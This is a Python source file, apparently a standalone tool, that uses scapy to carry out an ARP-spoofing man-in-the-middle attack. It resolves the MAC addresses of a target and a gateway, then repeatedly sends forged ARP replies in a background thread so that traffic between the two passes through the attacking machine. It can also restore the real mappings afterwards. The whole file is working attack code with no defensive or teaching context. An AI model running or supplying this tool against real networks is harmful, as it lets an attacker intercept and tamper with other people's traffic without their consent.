import threading
from time import sleep

from scapy.all import *
from scapy.layers.l2 import Ether, ARP

ARP_REQUEST = 1
ARP_REPLY = 2
ARP_REQUEST_TIMEOUT = 5  # seconds
BROADCAST_MAC = "ff:ff:ff:ff:ff:ff"

logging.getLogger(scapy.__name__).setLevel(logging.ERROR)
logging.basicConfig(format='%(asctime)s %(message)s', datefmt='%m/%d/%Y %I:%M:%S %p', level=logging.INFO)
logger = logging.getLogger()


class MITMService:
    @staticmethod
    def _get_mac(target_ip, mac_resolve_max_tries):
        """
        queries network for MAC address corresponding to :param target_ip
        :param target_ip: IP address
        :return: mac address that matches :param target_ip
        """
        arp_response = None
        try_count = 0

        while not arp_response:
            if try_count > mac_resolve_max_tries:
                raise ValueError("cannot resolve {}. are you sure it exists ?".format(target_ip))

            logger.info("sending who-has for {}".format(target_ip))
            arp_request = Ether(dst=BROADCAST_MAC) / ARP(op=ARP_REQUEST, pdst=target_ip)
            arp_response = srp(arp_request, timeout=ARP_REQUEST_TIMEOUT, verbose=False)[0]
            try_count += 1

        target_mac = arp_response[0][0][1].hwsrc
        logger.info("got mac: {}".format(target_mac))
        return target_mac

    @staticmethod
    def _poison_arp_cache(target_ip, target_mac, ip_to_spoof):
        """
        function sets targets arp cache so that source_ip resolves to this machine's MAC
        :param target_ip: IP destination for our poisoned ARP reply
        :param target_mac: MAC destination for our poisoned ARP reply (so to not trigger additional ARP query)
        :param ip_to_spoof: IP to edit in target arp cache
        """
        spoofed = ARP(op=ARP_REPLY, pdst=target_ip, psrc=ip_to_spoof, hwdst=target_mac)
        send(spoofed, verbose=False)

    @staticmethod
    def _reset_arp_cache(target_ip, target_mac, source_ip, source_mac):
        reset = ARP(op=ARP_REPLY, hwsrc=source_mac, psrc=source_ip, hwdst=target_mac, pdst=target_ip)
        send(reset, verbose=False)

    def __init__(self, target_ip, gateway_ip, interval=5, mac_resolve_max_tries=5):
        """
        :param target_ip: will intercept requests from this IP
        :param gateway_ip: will intercept responses from this IP (directed at :param target_ip)
        :param interval: how often to run arp poison
        """
        self.target_ip = target_ip
        self.target_mac = MITMService._get_mac(self.target_ip, mac_resolve_max_tries)

        self.gateway_ip = gateway_ip
        self.gateway_mac = MITMService._get_mac(self.gateway_ip, mac_resolve_max_tries)

        self.interval = interval
        self._should_spoof = False
        self._spoof_thread = None

    def _run_mitm(self):
        """
        inserts this machine between target_ip and gateway_ip
        """
        while self._should_spoof:
            MITMService._poison_arp_cache(self.target_ip, self.target_mac, self.gateway_ip)
            MITMService._poison_arp_cache(self.gateway_ip, self.gateway_mac, self.target_ip)
            sleep(self.interval)

    def _restore_normal_arp(self):
        """
        resets ip/mac mapping so that gateway ip resolves to gateway mac, and target ip resolves to target mac
        """
        MITMService._reset_arp_cache(self.target_ip, self.target_mac, self.gateway_ip, self.gateway_mac)
        MITMService._reset_arp_cache(self.gateway_ip, self.gateway_mac, self.target_ip, self.target_mac)

    def start_mitm(self):
        logger.info("starting spoof")

        self._should_spoof = True
        self._spoof_thread = threading.Thread(target=self._run_mitm, args=())
        self._spoof_thread.start()

    def stop_mitm(self):
        self._should_spoof = False
        self._spoof_thread.join()
        self._restore_normal_arp()
